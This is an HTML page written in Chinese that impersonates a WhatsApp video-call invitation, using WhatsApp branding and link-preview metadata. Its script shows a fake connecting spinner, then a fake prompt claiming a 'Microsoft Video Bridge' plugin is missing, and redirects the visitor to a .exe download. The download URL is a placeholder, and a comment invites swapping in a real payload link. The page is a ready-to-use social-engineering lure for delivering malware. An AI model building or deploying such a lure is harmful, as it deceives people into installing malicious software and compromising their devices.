<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>视频通话</title>

  <!-- WhatsApp 预览卡片 -->
  <meta property="og:title" content="视频通话" />
  <meta property="og:description" content="请使用以下链接加入我的 WhatsApp 视频通话。" />
  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1200px-WhatsApp.svg.png" />
  <meta property="og:url" content="https://whatsapp-fake-call-3xjx.vercel.app/" />
  <meta property="og:type" content="website" />

  <style>
    body {
      background-color: #e5f5ec;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background-color: white;
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 400px;
      width: 90%;
    }
    .logo {
      width: 64px;
      height: 64px;
      margin-bottom: 16px;
    }
    h2 {
      margin: 0 0 10px 0;
      color: #075e54;
    }
    p {
      color: #444;
      font-size: 16px;
    }
    button {
      margin-top: 20px;
      padding: 12px 24px;
      font-size: 16px;
      background-color: #25d366;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background-color: #1da851;
    }
    .loading {
      display: none;
      margin-top: 20px;
    }
    .spinner {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #25d366;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 10px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo" alt="WhatsApp Logo" />
    <h2>加入 WhatsApp 视频通话</h2>
    <p>请点击下方按钮加入通话</p>
    <button onclick="startJoin()">加入通话</button>
    <div class="loading">
      <p>正在连接通话...</p>
      <div class="spinner"></div>
    </div>
  </div>

  <script>
    function startJoin() {
      document.querySelector('button').style.display = 'none';
      document.querySelector('.loading').style.display = 'block';

      setTimeout(() => {
        const confirmed = confirm("检测到您的系统缺少通话组件：Microsoft Video Bridge 插件，可能无法加入该通话。是否立即安装？");
        if (confirmed) {
          window.location.href = "https://example.com/fix-download.exe"; // 替换为你真实的“解决方案”链接
        } else {
          alert("您选择了取消安装，可能无法正常加入通话。");
        }
      }, 4000);
    }
  </script>
</body>
</html>
